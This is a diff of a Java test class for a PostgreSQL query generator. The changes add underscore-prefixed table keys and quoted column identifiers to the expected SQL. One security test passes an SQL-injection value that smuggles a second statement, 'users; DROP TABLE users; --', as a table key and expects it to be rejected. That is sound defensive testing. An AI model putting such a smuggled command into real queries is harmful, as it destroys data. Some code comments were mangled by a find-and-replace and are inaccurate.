@@ -12,8 +12,10 @@ import edu.ukma.smart.virtual.create.Property;
 import edu.ukma.smart.virtual.create.ReferenceProperty;
 import edu.ukma.smart.virtual.create.StringProperty;
 import edu.ukma.smart.virtual.delete.DeleteRow;
+import edu.ukma.smart.virtual.delete.DeleteTable;
 import edu.ukma.smart.virtual.errors.InputValidationErr;
 import edu.ukma.smart.virtual.errors.Return;
+import edu.ukma.smart.virtual.insert.InsertRow;
 import edu.ukma.smart.virtual.select.BooleanPredicate;
 import edu.ukma.smart.virtual.select.CompoundPredicate;
 import edu.ukma.smart.virtual.select.DecimalPredicate;
@@ -58,7 +60,7 @@ public class PostgreQueryGeneratorTest {
             StringProperty.builder()
                 .key("name")
                 .name("Name")
-                .description("User name")
+                .description("User \"name\"")
                 .defaultValue("default_name")
                 .required(true)
                 .unique(false)
@@ -96,7 +98,7 @@ public class PostgreQueryGeneratorTest {
                 .scale(2)
                 .build()
         );
-        NewTable newTable = NewTable.builder().key("users").name("users").description("users")
+        NewTable newTable = NewTable.builder().key("_users").name("_users").description("_users")
             .properties(properties).build();
 
         // When
@@ -107,20 +109,20 @@ public class PostgreQueryGeneratorTest {
         String sql = result.value();
 
         // Verify table structure
-        assertTrue(sql.contains("CREATE TABLE public.users"));
+        assertTrue(sql.contains("CREATE TABLE public._users"));
         assertTrue(sql.contains("_id SERIAL PRIMARY KEY NOT NULL"));
         assertTrue(sql.contains("_created TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL"));
 
         // Verify columns
-        assertTrue(sql.contains("name TEXT DEFAULT $$default_name$$ NOT NULL"));
-        assertTrue(sql.contains("age BIGINT DEFAULT 25"));
-        assertTrue(sql.contains("active BOOLEAN DEFAULT true"));
-        assertTrue(sql.contains("salary NUMERIC(10,2) DEFAULT 50000.00"));
+        assertTrue(sql.contains("\"name\" TEXT DEFAULT $$default_name$$ NOT NULL"));
+        assertTrue(sql.contains("\"age\" BIGINT DEFAULT 25"));
+        assertTrue(sql.contains("\"active\" BOOLEAN DEFAULT true"));
+        assertTrue(sql.contains("\"salary\" NUMERIC(10,2) DEFAULT 50000.00"));
 
         // Verify constraints
-        assertTrue(sql.contains("CHECK (char_length(name) BETWEEN 1 AND 50)"));
-        assertTrue(sql.contains("CHECK (age BETWEEN 0 AND 120)"));
-        assertTrue(sql.contains("CHECK (salary BETWEEN 0.000000 AND 999999.990000)"));
+        assertTrue(sql.contains("CHECK (char_length(\"name\") BETWEEN 1 AND 50)"));
+        assertTrue(sql.contains("CHECK (\"age\" BETWEEN 0 AND 120)"));
+        assertTrue(sql.contains("CHECK (\"salary\" BETWEEN 0.000000 AND 999999.990000)"));
     }
 
     @Test
@@ -133,10 +135,10 @@ public class PostgreQueryGeneratorTest {
                 .description("Reference to user")
                 .required(true)
                 .unique(false)
-                .refTableKey("users")
+                .refTableKey("_users")
                 .build()
         );
-        NewTable newTable = new NewTable("orders", "orders", "orders", properties);
+        NewTable newTable = new NewTable("_orders", "_orders", "_orders", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -145,8 +147,8 @@ public class PostgreQueryGeneratorTest {
         assertTrue(result.error().isEmpty());
         String sql = result.value();
 
-        assertTrue(sql.contains("user_id INTEGER NOT NULL"));
-        assertTrue(sql.contains("FOREIGN KEY (user_id) REFERENCES users(_id)"));
+        assertTrue(sql.contains("\"user_id\" INTEGER NOT NULL"));
+        assertTrue(sql.contains("FOREIGN KEY (\"user_id\") REFERENCES _users(_id)"));
     }
 
     // ========== SECURITY TESTS - TABLE KEY VALIDATION ==========
@@ -156,7 +158,7 @@ public class PostgreQueryGeneratorTest {
         return new Object[][] {
             {"Users"},           // uppercase
             {"user-name"},       // hyphen
-            {"user name"},       // space
+            {"user \"name\""},       // space
             {"user@name"},       // special character
             {"1users"},          // starts with number
             {""},                // empty
@@ -175,9 +177,9 @@ public class PostgreQueryGeneratorTest {
         // Given
         List<Property<?>> properties = List.of(
             StringProperty.builder()
-                .key("name")
+                .key("_name")
                 .name("Name")
-                .description("User name")
+                .description("User \"name\"")
                 .defaultValue("default")
                 .required(true)
                 .unique(false)
@@ -185,7 +187,7 @@ public class PostgreQueryGeneratorTest {
                 .maxLength(50)
                 .build()
         );
-        NewTable newTable = new NewTable(invalidKey, invalidKey, invalidKey, properties);
+        NewTable newTable = new NewTable(invalidKey, "Name", invalidKey, properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -198,11 +200,11 @@ public class PostgreQueryGeneratorTest {
     @DataProvider(name = "validTableKeys")
     public Object[][] validTableKeys() {
         return new Object[][] {
-            {"users"},
-            {"user_profile"},
-            {"user_data_log"},
-            {"a".repeat(62)},  // exactly 100 chars
-            {"ab"}              // exactly 2 chars
+            {"_users"},
+            {"_user_profile"},
+            {"_user_data_log"},
+            {"_" + "a".repeat(62)},  // exactly 100 chars
+            {"_ab"}              // exactly 2 chars
         };
     }
 
@@ -213,7 +215,7 @@ public class PostgreQueryGeneratorTest {
             StringProperty.builder()
                 .key("name")
                 .name("Name")
-                .description("User name")
+                .description("User \"name\"")
                 .defaultValue("default")
                 .required(true)
                 .unique(false)
@@ -240,7 +242,7 @@ public class PostgreQueryGeneratorTest {
             StringProperty.builder()
                 .key(invalidKey)
                 .name("Name")
-                .description("User name")
+                .description("User \"name\"")
                 .defaultValue("default")
                 .required(true)
                 .unique(false)
@@ -248,7 +250,7 @@ public class PostgreQueryGeneratorTest {
                 .maxLength(50)
                 .build()
         );
-        NewTable newTable = new NewTable("users", "users", "users", properties);
+        NewTable newTable = new NewTable("_users", "_users", "_users", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -272,10 +274,10 @@ public class PostgreQueryGeneratorTest {
                 .description("Reference to user")
                 .required(true)
                 .unique(false)
-                .refTableKey("users")
+                .refTableKey("_users")
                 .build()
         );
-        NewTable newTable = new NewTable("orders", "orders", "orders", properties);
+        NewTable newTable = new NewTable("_orders", "_orders", "_orders", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -297,7 +299,7 @@ public class PostgreQueryGeneratorTest {
                 .refTableKey("Invalid-Table")
                 .build()
         );
-        NewTable newTable = new NewTable("orders", "orders", "orders", properties);
+        NewTable newTable = new NewTable("_orders", "_orders", "_orders", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -328,7 +330,7 @@ public class PostgreQueryGeneratorTest {
                 .scale(2)
                 .build()
         );
-        NewTable newTable = new NewTable("products", "products", "products", properties);
+        NewTable newTable = new NewTable("_products", "products", "products", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -356,7 +358,7 @@ public class PostgreQueryGeneratorTest {
                 .scale(0) // scale = 0
                 .build()
         );
-        NewTable newTable = new NewTable("products", "products", "products", properties);
+        NewTable newTable = new NewTable("_products", "products", "products", properties);
 
         // When
         Return<String> result = queryBuilder.createTable(newTable);
@@ -382,7 +384,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("items")
+            .key("_items")
             .name("Items Table")
             .description("Test table for items")
             .properties(properties)
@@ -412,7 +414,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("items")
+            .key("_items")
             .name("Items Table")
             .description("Test table for items")
             .properties(properties)
@@ -434,17 +436,17 @@ public class PostgreQueryGeneratorTest {
     @Test
     public void testDeleteTableWithValidKey() {
         // When
-        Return<String> result = queryBuilder.deleteTable("users");
+        Return<String> result = queryBuilder.deleteTable(DeleteTable.of("_users"));
 
         // Then
         assertTrue(result.error().isEmpty());
-        assertEquals(result.value(), "DROP TABLE users;");
+        assertEquals(result.value(), "DROP TABLE _users;");
     }
 
     @Test(dataProvider = "invalidTableKeys")
     public void testDeleteTableWithInvalidKey(String invalidKey) {
         // When
-        Return<String> result = queryBuilder.deleteTable(invalidKey);
+        Return<String> result = queryBuilder.deleteTable(DeleteTable.of(invalidKey));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -468,23 +470,23 @@ public class PostgreQueryGeneratorTest {
         );
 
         // When
-        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of("_users", columnValues));
 
         // Then
         assertTrue(result.error().isEmpty());
         String sql = result.value();
 
-        assertEquals(sql, "INSERT INTO users (name,age,active,salary,department_id) VALUES (?,?,?,?,?);");
+        assertEquals(sql, "INSERT INTO _users (\"name\",\"age\",\"active\",\"salary\",\"department_id\") VALUES (?,?,?,?,?);");
     }
 
     @Test
     public void testInsertIntoTableWithNoColumns() {
         // When
-        Return<String> result = queryBuilder.insertIntoTable("users", Collections.emptyList());
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of("_users", Collections.emptyList()));
 
         // Then
         assertTrue(result.error().isEmpty());
-        assertEquals(result.value(), "INSERT INTO users DEFAULT VALUES;");
+        assertEquals(result.value(), "INSERT INTO _users DEFAULT VALUES;");
     }
 
     @Test(dataProvider = "invalidTableKeys")
@@ -493,7 +495,7 @@ public class PostgreQueryGeneratorTest {
         List<ColumnValue<?>> columnValues = List.of(StringValue.of("name", "John Doe"));
 
         // When
-        Return<String> result = queryBuilder.insertIntoTable(invalidKey, columnValues);
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of(invalidKey, columnValues));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -509,7 +511,7 @@ public class PostgreQueryGeneratorTest {
         List<ColumnValue<?>> columnValues = List.of(StringValue.of(invalidKey, "John Doe"));
 
         // When
-        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of("_users", columnValues));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -529,14 +531,14 @@ public class PostgreQueryGeneratorTest {
         );
 
         // When
-        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of("_users", columnValues));
 
         // Then
         assertTrue(result.error().isEmpty());
         String sql = result.value();
 
         // Verify the malicious content is properly escaped with $$ quoting
-        assertEquals(sql, "INSERT INTO users (name) VALUES (?);");
+        assertEquals(sql, "INSERT INTO _users (\"name\") VALUES (?);");
     }
 
     @Test
@@ -548,7 +550,7 @@ public class PostgreQueryGeneratorTest {
 
         // When
         Return<String> result =
-            queryBuilder.insertIntoTable("users; DROP TABLE users; --", columnValues);
+            queryBuilder.insertIntoTable(InsertRow.of("users; DROP TABLE users; --", columnValues));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -566,7 +568,7 @@ public class PostgreQueryGeneratorTest {
         );
 
         // When
-        Return<String> result = queryBuilder.insertIntoTable("users", columnValues);
+        Return<String> result = queryBuilder.insertIntoTable(InsertRow.of("_users", columnValues));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -589,7 +591,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("items")
+            .key("_items")
             .name("Items Table")
             .description("Test table for items")
             .properties(properties)
@@ -611,11 +613,11 @@ public class PostgreQueryGeneratorTest {
     @Test
     public void testDeleteFromTableWithValidData() {
         // When
-        Return<String> result = queryBuilder.deleteFromTable(DeleteRow.of("users", 123));
+        Return<String> result = queryBuilder.deleteFromTable(DeleteRow.of("_users", 123));
 
         // Then
         assertTrue(result.error().isEmpty());
-        assertEquals(result.value(), "DELETE FROM users WHERE _id = 123;");
+        assertEquals(result.value(), "DELETE FROM _users WHERE _id = 123;");
     }
 
     @Test(dataProvider = "invalidTableKeys")
@@ -634,7 +636,7 @@ public class PostgreQueryGeneratorTest {
     @Test
     public void testDeleteFromTableWithNegativeId() {
         // When
-        Return<String> result = queryBuilder.deleteFromTable(DeleteRow.of("users", -1));
+        Return<String> result = queryBuilder.deleteFromTable(DeleteRow.of("_users", -1));
 
         // Then
         assertTrue(result.error().isPresent());
@@ -670,7 +672,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("employees")
+            .key("_employees")
             .name("Employees Table")
             .description("Table for storing employee information")
             .properties(properties)
@@ -683,8 +685,8 @@ public class PostgreQueryGeneratorTest {
         assertTrue(result.error().isEmpty());
         String sql = result.value();
 
-        assertTrue(sql.contains("email TEXT DEFAULT $$default@example.com$$ NOT NULL UNIQUE"));
-        assertTrue(sql.contains("employee_id BIGINT DEFAULT 1000 NOT NULL UNIQUE"));
+        assertTrue(sql.contains("\"email\" TEXT DEFAULT $$default@example.com$$ NOT NULL UNIQUE"));
+        assertTrue(sql.contains("\"employee_id\" BIGINT DEFAULT 1000 NOT NULL UNIQUE"));
     }
 
     @Test
@@ -711,7 +713,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("people")
+            .key("_people")
             .name("People Table")
             .description("Table for storing people information")
             .properties(properties)
@@ -724,11 +726,11 @@ public class PostgreQueryGeneratorTest {
         assertTrue(result.error().isEmpty());
         String sql = result.value();
 
-        assertTrue(sql.contains("middle_name TEXT DEFAULT NULL"));
-        assertTrue(sql.contains("optional_number BIGINT DEFAULT NULL"));
+        assertTrue(sql.contains("\"middle_name\" TEXT DEFAULT NULL"));
+        assertTrue(sql.contains("\"optional_number\" BIGINT DEFAULT NULL"));
         // Should not contain NOT NULL for these columns
-        assertFalse(sql.matches(".*middle_name.*NOT NULL.*"));
-        assertFalse(sql.matches(".*optional_number.*NOT NULL.*"));
+        assertFalse(sql.matches(".*\"middle_name\".*NOT NULL.*"));
+        assertFalse(sql.matches(".*\"optional_number\".*NOT NULL.*"));
     }
 
 // ========== BOUNDARY VALUE TESTS ==========
@@ -750,7 +752,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("test_table")
+            .key("_test_table")
             .name("Test Table")
             .description("Table for testing maximum precision and scale")
             .properties(properties)
@@ -781,7 +783,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("test_table")
+            .key("_test_table")
             .name("Test Table")
             .description("Table for testing precision validation")
             .properties(properties)
@@ -815,7 +817,7 @@ public class PostgreQueryGeneratorTest {
                 .build()
         );
         NewTable newTable = NewTable.builder()
-            .key("test_table")
+            .key("_test_table")
             .name("Test Table")
             .description("Table for testing scale validation")
             .properties(properties)
@@ -835,7 +837,7 @@ public class PostgreQueryGeneratorTest {
     @Test
     public void testUpdateQueryGenerating() {
         var updateRow = UpdateRow.of(
-            "table_key",
+            "_table_key",
             1,
             List.of(
                 StringValue.of("s_prop", "123"),
@@ -849,7 +851,8 @@ public class PostgreQueryGeneratorTest {
         var query = queryBuilder.updateRow(updateRow);
 
         assertFalse(query.error().isPresent());
-        assertEquals(query.value(), "UPDATE public.table_key SET s_prop=?,i_prop=?,b_prop=?,r_prop=?,d_prop=? WHERE _id=?;");
+        assertEquals(query.value(),
+            "UPDATE public._table_key SET \"s_prop\"=?,\"i_prop\"=?,\"b_prop\"=?,\"r_prop\"=?,\"d_prop\"=? WHERE _id=?;");
     }
 
     @Test
@@ -918,266 +921,266 @@ public class PostgreQueryGeneratorTest {
         return new Object[][] {
             // selects without conditions
             {
-                SelectQuery.wildcard("key"),
-                SelectStatement.of("SELECT * FROM public.key ;", List.of())
+                SelectQuery.wildcard("_key"),
+                SelectStatement.of("SELECT * FROM public._key ;", List.of())
             },
             {
-                SelectQuery.of("key", List.of()),
-                SelectStatement.of("SELECT * FROM public.key ;", List.of())
+                SelectQuery.of("_key", List.of()),
+                SelectStatement.of("SELECT * FROM public._key ;", List.of())
             },
             {
-                SelectQuery.of("key", List.of(SelectProperty.of("column"))),
-                SelectStatement.of("SELECT column FROM public.key ;", List.of())},
+                SelectQuery.of("_key", List.of(SelectProperty.of("column"))),
+                SelectStatement.of("SELECT \"column\" FROM public._key ;", List.of())},
             {
-                SelectQuery.of("key", List.of(SelectProperty.of("column_one"), SelectProperty.of("column_two"))),
-                SelectStatement.of("SELECT column_one,column_two FROM public.key ;", List.of())},
+                SelectQuery.of("_key", List.of(SelectProperty.of("column_one"), SelectProperty.of("column_two"))),
+                SelectStatement.of("SELECT \"column_one\",\"column_two\" FROM public._key ;", List.of())},
 
             {
-                SelectQuery.of("key",
+                SelectQuery.of("_key",
                     List.of(
                         SelectProperty.of("column_one"),
                         SelectProperty.of("column_two"),
                         SelectProperty.of("column_three")
                     )
                 ),
-                SelectStatement.of("SELECT column_one,column_two,column_three FROM public.key ;", List.of())
+                SelectStatement.of("SELECT \"column_one\",\"column_two\",\"column_three\" FROM public._key ;", List.of())
             },
 
-            // Valid table name edge cases
+            // Valid table \"name\" edge cases
             {
-                SelectQuery.wildcard("aa"),
-                SelectStatement.of("SELECT * FROM public.aa ;", List.of())
+                SelectQuery.wildcard("_aa"),
+                SelectStatement.of("SELECT * FROM public._aa ;", List.of())
             },
             {
-                SelectQuery.wildcard("table_name"),
-                SelectStatement.of("SELECT * FROM public.table_name ;", List.of())
+                SelectQuery.wildcard("_table_name"),
+                SelectStatement.of("SELECT * FROM public._table_name ;", List.of())
             },
             {
-                SelectQuery.wildcard("a".repeat(63)), // 63 characters - should be valid as it's exactly at limit
-                SelectStatement.of("SELECT * FROM public." + "a".repeat(63) + " ;", List.of())
+                SelectQuery.wildcard("_" + "a".repeat(61)), // 62 characters - should be valid as it's exactly at limit
+                SelectStatement.of("SELECT * FROM public." + "_" + "a".repeat(61) + " ;", List.of())
             },
 
-            // Valid column name edge cases
+            // Valid column \"name\" edge cases
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("aa"))),
-                SelectStatement.of("SELECT aa FROM public.table ;", List.of())
+                SelectQuery.of("_table", List.of(SelectProperty.of("aa"))),
+                SelectStatement.of("SELECT \"aa\" FROM public._table ;", List.of())
             },
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("column_with_underscores"))),
-                SelectStatement.of("SELECT column_with_underscores FROM public.table ;", List.of())
+                SelectQuery.of("_table", List.of(SelectProperty.of("column_with_underscores"))),
+                SelectStatement.of("SELECT \"column_with_underscores\" FROM public._table ;", List.of())
             },
             {
-                SelectQuery.of("table", List.of(SelectProperty.of("a".repeat(63)))), // 63 characters - should be valid
-                SelectStatement.of("SELECT " + "a".repeat(63) + " FROM public.table ;", List.of())
+                SelectQuery.of("_table", List.of(SelectProperty.of("a".repeat(63)))), // 63 characters - should be valid
+                SelectStatement.of("SELECT \"" + "a".repeat(63) + "\" FROM public._table ;", List.of())
             },
 
             // Maximum number of columns (100 columns)
             {
-                SelectQuery.of("table", generateColumnList(100)),
+                SelectQuery.of("_table", generateColumnList(100)),
                 SelectStatement.of(
                     "SELECT " + String.join(",",
-                        generateColumnList(100).stream().map(SelectProperty::propertyKey).toList())
-                        + " FROM public.table ;",
+                        generateColumnList(100).stream().map(v -> "\"%s\"".formatted(v.propertyKey())).toList())
+                    + " FROM public._table ;",
                     List.of())
             },
 
-            // Valid table names with various patterns
+            // Valid table \"name\"s with various patterns
             {
-                SelectQuery.wildcard("user_profile"),
-                SelectStatement.of("SELECT * FROM public.user_profile ;", List.of())
+                SelectQuery.wildcard("_user_profile"),
+                SelectStatement.of("SELECT * FROM public._user_profile ;", List.of())
             },
             {
-                SelectQuery.wildcard("order_items"),
-                SelectStatement.of("SELECT * FROM public.order_items ;", List.of())
+                SelectQuery.wildcard("_order_item"),
+                SelectStatement.of("SELECT * FROM public._order_item ;", List.of())
             },
 
             // Predicate testing
             {
-                SelectQuery.wildcard("user_profile", BooleanPredicate.eq("is_admin", true)),
+                SelectQuery.wildcard("_user_profile", BooleanPredicate.eq("is_admin", true)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE is_admin=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"is_admin\"=? ;",
                     List.of(BooleanValue.of("is_admin", true))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", BooleanPredicate.ne("is_admin", true)),
+                SelectQuery.wildcard("_user_profile", BooleanPredicate.ne("is_admin", true)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE is_admin<>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"is_admin\"<>? ;",
                     List.of(BooleanValue.of("is_admin", true))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.eq("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.eq("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"=? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.ne("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.ne("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size<>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"<>? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.ls("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.ls("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size<? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"<? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.gt("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.gt("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\">? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.gre("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.gre("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size>=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\">=? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", IntegerPredicate.lse("foot_size", 42L)),
+                SelectQuery.wildcard("_user_profile", IntegerPredicate.lse("foot_size", 42L)),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size<=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"<=? ;",
                     List.of(IntegerValue.of("foot_size", 42L))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", DecimalPredicate.eq("foot_size", new BigDecimal("42.424242"))),
+                SelectQuery.wildcard("_user_profile", DecimalPredicate.eq("foot_size", new BigDecimal("42.424242"))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"=? ;",
                     List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", DecimalPredicate.ne("foot_size", new BigDecimal("42.424242"))),
+                SelectQuery.wildcard("_user_profile", DecimalPredicate.ne("foot_size", new BigDecimal("42.424242"))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size<>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"<>? ;",
                     List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", DecimalPredicate.ls("foot_size", new BigDecimal("42.424242"))),
+                SelectQuery.wildcard("_user_profile", DecimalPredicate.ls("foot_size", new BigDecimal("42.424242"))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size<? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\"<? ;",
                     List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", DecimalPredicate.gt("foot_size", new BigDecimal("42.424242"))),
+                SelectQuery.wildcard("_user_profile", DecimalPredicate.gt("foot_size", new BigDecimal("42.424242"))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\">? ;",
                     List.of(DecimalValue.of("foot_size", new BigDecimal("42.424242")))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", ReferencePredicate.in("foot_size", List.of(4, 2, 3, 1))),
+                SelectQuery.wildcard("_user_profile", ReferencePredicate.in("foot_size", List.of(4, 2, 3, 1))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size IN (?,?,?,?) ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\" IN (?,?,?,?) ;",
                     List.of(ListValue.of("foot_size", List.of(4, 2, 3, 1), Type.REFERENCE))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", ReferencePredicate.notIn("foot_size", List.of(4, 2, 3, 1))),
+                SelectQuery.wildcard("_user_profile", ReferencePredicate.notIn("foot_size", List.of(4, 2, 3, 1))),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE foot_size NOT IN (?,?,?,?) ;",
+                    "SELECT * FROM public._user_profile WHERE \"foot_size\" NOT IN (?,?,?,?) ;",
                     List.of(ListValue.of("foot_size", List.of(4, 2, 3, 1), Type.REFERENCE))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.eq("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.eq("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"=? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.ne("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.ne("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name<>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"<>? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.gt("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.gt("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name>? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\">? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.gte("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.gte("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name>=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\">=? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.ls("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.ls("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name<? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"<? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.lse("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.lse("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name<=? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"<=? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.like("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.like("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name~~? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"~~? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
-                SelectQuery.wildcard("user_profile", StringPredicate.notLike("name", "Kimberly")),
+                SelectQuery.wildcard("_user_profile", StringPredicate.notLike("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT * FROM public.user_profile WHERE name!~~? ;",
+                    "SELECT * FROM public._user_profile WHERE \"name\"!~~? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
                 SelectQuery.of(
-                    "user_profile",
+                    "_user_profile",
                     List.of(
                         SelectProperty.of("one"),
                         SelectProperty.of("two"),
                         SelectProperty.of("name")),
                     StringPredicate.like("name", "Kimberly")),
                 SelectStatement.of(
-                    "SELECT one,two,name FROM public.user_profile WHERE name~~? ;",
+                    "SELECT \"one\",\"two\",\"name\" FROM public._user_profile WHERE \"name\"~~? ;",
                     List.of(StringValue.of("name", "Kimberly"))
                 )
             },
             {
                 SelectQuery.wildcard(
-                    "user_profile",
+                    "_user_profile",
                     CompoundPredicate.and(StringPredicate.like("name", "Kimberly"), IntegerPredicate.gre("age", 25L))
                 ),
-                SelectStatement.of("SELECT * FROM public.user_profile WHERE (name~~? AND age>=?) ;",
+                SelectStatement.of("SELECT * FROM public._user_profile WHERE (\"name\"~~? AND \"age\">=?) ;",
                     List.of(StringValue.of("name", "Kimberly"), IntegerValue.of("age", 25L)))
             },
             {
                 SelectQuery.wildcard(
-                    "user_profile",
+                    "_user_profile",
                     CompoundPredicate.or(StringPredicate.like("name", "Kimberly"), IntegerPredicate.gre("age", 25L))
                 ),
